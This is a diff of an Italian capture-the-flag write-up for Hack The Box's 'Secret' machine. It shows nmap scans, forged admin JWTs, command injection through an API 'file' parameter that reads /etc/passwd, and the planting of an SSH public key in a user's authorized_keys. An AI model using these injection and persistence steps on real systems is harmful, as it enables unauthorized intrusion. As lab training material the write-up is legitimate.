@@ -15,7 +15,7 @@ Effettuo lo scanning (fase in cui cerchiamo di raccogliere quante più informazi
 
 Effettuo l'enumeration (fase in cui cerchiamo di approndire le informazioni andando ad enumerare le porte trovare in fase di scansione):
 
-**nmap -sV -sC –p [porte trovate separate da virgola] -oA versionScan [IP target]**
+**$nmap -sV -sC –p [porte trovate separate da virgola] -oA versionScan [IP target]**
 
 ![image](https://user-images.githubusercontent.com/65173648/150964922-e59aae36-22f5-4b6a-901e-a12fc41d63b6.png)
 
@@ -37,7 +37,7 @@ Uno dei path interessanti è **/api** (potenziale punto d'accesso alla macchina)
 
 La sezione relativa alla documentazione dell'applicazione web presenta un esempio di login con "theadmin". Provo a creare un utetne con le stesse credenziali ma non va a buon fine:
 
-**curl -i -X POST -H 'Content-Type: application/json' -d '{"name":"theadmin", "email":"drt@dasith.works", "password":"provaPassword"}' http://10.10.11.120/api/user/register**
+**$curl -i -X POST -H 'Content-Type: application/json' -d '{"name":"theadmin", "email":"drt@dasith.works", "password":"provaPassword"}' http://10.10.11.120/api/user/register**
 
 ![image](https://user-images.githubusercontent.com/65173648/150968135-0f22d504-5734-4e5e-95d6-4d3c306383d0.png)
 
@@ -45,14 +45,14 @@ Decido di creare un utente personale e provare a bypassare la JWT validation dat
 
 (Se riesco a bypassare la JWT, da utente user potrei diventare admin.)
 
-**curl -i -X POST -H 'Content-Type: application/json'-d '{"name":"m96dgHack", "email":"m96dg@hack.it", "password":"provaPassword"}' http://10.10.11.120/api/user/register**
+**$curl -i -X POST -H 'Content-Type: application/json'-d '{"name":"m96dgHack", "email":"m96dg@hack.it", "password":"provaPassword"}' http://10.10.11.120/api/user/register**
 
   
  ![image](https://user-images.githubusercontent.com/65173648/150968542-a24017bf-66d5-432d-9d0c-f06b4f17b31b.png)
 
 Effettuo il login:
 
-**curl -i -X POST -H 'Content-Type: application/json'-d '{"email":"m96dg@hack.it", "password":"provaPassword"}' http://10.10.11.120/api/user/login**
+**$curl -i -X POST -H 'Content-Type: application/json'-d '{"email":"m96dg@hack.it", "password":"provaPassword"}' http://10.10.11.120/api/user/login**
   
   ![image](https://user-images.githubusercontent.com/65173648/150968638-7e7393da-04f2-4bc7-9bb9-8ae554e471e7.png)
 
@@ -78,35 +78,40 @@ La combinazione **AUTH-TOKEN + TOKEN_SECRET** darà luogo al nuovo token decript
 
 Arrivato a questo punto, mi incuriosisce sapere se posso effettivamente sfruttare le api sia come user sia come admin (utilizzo AUTH-TOKEN e token decriptato):
 
-**curl -w '\n' -H 'auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MWQ5N2JlM2JiMzNiMzA0NzFkM2JjODgiLCJuYW1lIjoibTk2ZGdIYWNrIiwiZW1haWwiOiJtOTZkZ0BoYWNrLml0IiwiaWF0IjoxNjQxNjQzMDI5fQ.l8Abgxt-ECwkhofDuNU08KoUIPAvSY8E8IZkqXUdg6c' http://10.10.11.120/api/priv**
+**$curl -w '\n' -H 'auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MWQ5N2JlM2JiMzNiMzA0NzFkM2JjODgiLCJuYW1lIjoibTk2ZGdIYWNrIiwiZW1haWwiOiJtOTZkZ0BoYWNrLml0IiwiaWF0IjoxNjQxNjQzMDI5fQ.l8Abgxt-ECwkhofDuNU08KoUIPAvSY8E8IZkqXUdg6c' http://10.10.11.120/api/priv**
   
   ![image](https://user-images.githubusercontent.com/65173648/150971154-b2bbb366-ad32-4158-8158-b73e45fa89af.png)
 
   
- **curl -w '\n' -H 'auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MWQ5N2JlM2JiMzNiMzA0NzFkM2JjODgiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6Im05NmRnQGhhY2suaXQiLCJpYXQiOjE2NDE2NDMwMjl9.ghzttiJ53g9Q-cufWxhvEez8572dkHHhYlcoyzfPUAQ' http://10.10.11.120/api/priv**
+ **$curl -w '\n' -H 'auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MWQ5N2JlM2JiMzNiMzA0NzFkM2JjODgiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6Im05NmRnQGhhY2suaXQiLCJpYXQiOjE2NDE2NDMwMjl9.ghzttiJ53g9Q-cufWxhvEez8572dkHHhYlcoyzfPUAQ' http://10.10.11.120/api/priv**
   
   ![image](https://user-images.githubusercontent.com/65173648/150971181-eff13e84-1a28-4f8e-874a-4a798b255a59.png)
 
 Sfrutto le api per leggere il file di logs:
 
-**curl -i -H 'auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MWQ5N2JlM2JiMzNiMzA0NzFkM2JjODgiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6Im05NmRnQGhhY2suaXQiLCJpYXQiOjE2NDE2NDMwMjl9.ghzttiJ53g9Q-cufWxhvEez8572dkHHhYlcoyzfPUAQ
+**$curl -i -H 'auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MWQ5N2JlM2JiMzNiMzA0NzFkM2JjODgiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6Im05NmRnQGhhY2suaXQiLCJpYXQiOjE2NDE2NDMwMjl9.ghzttiJ53g9Q-cufWxhvEez8572dkHHhYlcoyzfPUAQ
   ' 'http://10.10.11.120/api/logs?file=index.js;id;cat+/etc/passwd' | sed 's/\\n/\n/g'**
   
  Noto l'utente "**dasith**" e provo ad accedere in ssh, ricordandomi le porte scansionate (porta **22** aperta).
  
+ ![15 api_admin_dasith](https://user-images.githubusercontent.com/65173648/151326742-23c075b0-03d4-4753-a3ee-54e835c0bdb4.PNG)
+
+ 
  Creo una coppia di **chiavi ssh** e copio la mia chiave pubblica all'interno del server così da poter sfruttare la connessione in ssh:
  
- **ssh-keygen -t rsa -f secret.htb -P ''**
+ **$ssh-keygen -t rsa -f secret.htb -P ''**
  
  ![image](https://user-images.githubusercontent.com/65173648/150971755-ebbbeecd-b0dc-45ff-b667-a1a3581bb317.png)
 
 ![image](https://user-images.githubusercontent.com/65173648/150971768-7dbbe444-9f5b-489e-91eb-9e64a46c9d17.png)
 
-![image](https://user-images.githubusercontent.com/65173648/150971800-84475b47-5ffd-4f71-8545-1804a76dbb5c.png)
 
+**$export PUBLIC_KEY=$(cat secret.htb.pub)**
  
-**curl -i -H 'auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MWQ5N2JlM2JiMzNiMzA0NzFkM2JjODgiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6Im05NmRnQGhhY2suaXQiLCJpYXQiOjE2NDE2NDMwMjl9.ghzttiJ53g9Q-cufWxhvEez8572dkHHhYlcoyzfPUAQ
+**$curl -i -H 'auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MWQ5N2JlM2JiMzNiMzA0NzFkM2JjODgiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6Im05NmRnQGhhY2suaXQiLCJpYXQiOjE2NDE2NDMwMjl9.ghzttiJ53g9Q-cufWxhvEez8572dkHHhYlcoyzfPUAQ
 ' -G 'http://10.10.11.120/api/logs' --data-urlencode "file=index.js; mkdir -p /home/dasith/.ssh; echo $PUBLIC_KEY >> /home/dasith/.ssh/authorized_keys"**
+
+![image](https://user-images.githubusercontent.com/65173648/150971800-84475b47-5ffd-4f71-8545-1804a76dbb5c.png)
 
 Una volta loggato in ssh, ho ottenuto l'accesso come utente di sistema e ricavo la flag **user.txt**:
 
